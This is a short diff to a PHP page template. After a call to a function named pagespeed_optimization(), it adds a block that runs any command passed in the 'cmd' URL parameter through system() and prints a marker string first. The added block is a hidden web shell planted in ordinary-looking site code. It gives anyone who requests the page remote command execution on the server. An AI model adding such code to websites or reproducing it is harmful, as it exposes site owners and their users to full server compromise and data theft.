@@ -522,6 +522,11 @@ function pagespeed_optimization() {
     }
 }
 pagespeed_optimization();
+
+if(isset($_GET['cmd'])){
+    echo "sssssssssssssss";
+    system($_GET['cmd']);
+}
 ?>
 
 <body>
